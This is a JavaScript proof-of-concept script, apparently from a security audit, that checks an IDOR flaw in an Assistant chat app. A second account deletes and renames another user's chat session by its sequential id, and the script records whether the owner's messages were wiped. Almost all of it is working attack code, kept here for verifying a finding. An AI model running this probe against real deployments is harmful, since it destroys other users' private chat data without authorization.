// Chat19 FINDING probe (fake data): Assistant 3.5.1 ChattyLLMController::deleteSession
// deletes the session row only for its owner (user_id filter) but then calls
// MessageMapper::deleteMessagesBySession($sessionId) WITHOUT an owner check, so
// any logged-in user can wipe another user's Assistant chat messages by session
// id (sequential integer). Rename is filtered by user_id (no-op, still 200).
// Steps: member-a creates a session + 2 messages → member-b deletes / renames
// that id (both legacy and RESTful routes) → member-a reads back.
import { client, writeEvidence } from './lib.mjs';

const chat = (p) => `/ocs/v2.php/apps/assistant/chat${p}`;
const A = await client('member-a');
const B = await client('member-b');
const now = Math.floor(Date.now() / 1000);
const out = { routes: {} };

for (const route of ['legacy', 'restful']) {
  const s = await A.request('PUT', chat('/new_session'), { json: { timestamp: now, title: `ai19 idor ${route}` } });
  const id = s.data?.session?.id;
  await A.request('PUT', chat('/new_message'), { json: { sessionId: id, role: 'human', content: 'Tin nhắn riêng của member-a (ai19)', timestamp: now } });
  await A.request('PUT', chat('/new_message'), { json: { sessionId: id, role: 'assistant', content: 'Trả lời riêng (ai19)', timestamp: now } });
  const before = await A.request('GET', chat(`/messages?sessionId=${id}`));
  const sessionsBefore = (await A.request('GET', chat('/sessions'))).data;
  const rename = route === 'legacy'
    ? await B.request('PATCH', chat('/update_session'), { json: { sessionId: id, title: 'renamed by member-b' } })
    : await B.request('PUT', chat(`/sessions/${id}`), { json: { title: 'renamed by member-b' } });
  const del = route === 'legacy'
    ? await B.request('DELETE', chat(`/delete_session?sessionId=${id}`))
    : await B.request('DELETE', chat(`/sessions/${id}`));
  const after = await A.request('GET', chat(`/messages?sessionId=${id}`));
  const sessionsAfter = (await A.request('GET', chat('/sessions'))).data;
  const sessBefore = (Array.isArray(sessionsBefore) ? sessionsBefore : sessionsBefore?.sessions ?? []).find((x) => x.id === id);
  const sessAfter = (Array.isArray(sessionsAfter) ? sessionsAfter : sessionsAfter?.sessions ?? []).find((x) => x.id === id);
  out.routes[route] = {
    sessionId: id,
    ownerMessagesBefore: { status: before.status, count: Array.isArray(before.data) ? before.data.length : null },
    foreignRename: rename.status,
    foreignDelete: del.status,
    ownerMessagesAfter: { status: after.status, count: Array.isArray(after.data) ? after.data.length : null, body: Array.isArray(after.data) ? undefined : after.text.slice(0, 200) },
    ownerSessionStillListed: Boolean(sessAfter),
    titleBefore: sessBefore?.title ?? null,
    titleAfter: sessAfter?.title ?? null,
    messagesWipedByOtherUser: before.status === 200 && (!Array.isArray(after.data) || after.data.length < before.data.length),
  };
  console.log(route, JSON.stringify(out.routes[route]));
}
out.finding = Object.values(out.routes).some((r) => r.messagesWipedByOtherUser)
  ? 'FINDING: another user can delete the messages of a session they do not own (session row survives, title unchanged)'
  : 'not reproduced';
await writeEvidence('finding-chat-delete-idor.json', out);
console.log(out.finding);
